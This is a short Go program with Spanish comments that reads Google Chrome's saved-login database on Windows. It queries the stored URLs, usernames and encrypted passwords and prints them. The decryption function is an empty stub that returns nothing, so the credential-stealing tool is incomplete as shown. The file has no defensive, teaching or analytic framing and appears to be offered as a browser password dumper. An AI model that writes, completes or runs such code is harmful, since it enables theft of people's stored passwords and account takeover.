package main

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path/filepath"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	// Ruta de la base de datos de contraseñas de Chrome
	homeDir, _ := os.UserHomeDir()
	dbPath := filepath.Join(homeDir, "/AppData/Local/Google/Chrome/User Data/Default/Login Data")

	// Conectarse a la base de datos
	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	// Consultar las contraseñas guardadas
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	// Recorrer los resultados y mostrar las contraseñas
	for rows.Next() {
		var originURL, username, password string
		err := rows.Scan(&originURL, &username, &password)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Printf("URL: %s\n", originURL)
		fmt.Printf("Username: %s\n", username)
		fmt.Printf("Password: %s\n", decryptChromePassword(password))
	}

	if err = rows.Err(); err != nil {
		log.Fatal(err)
	}
}

// Función para descifrar la contraseña encriptada de Chrome
func decryptChromePassword(encryptedPassword string) string {

	return ""
}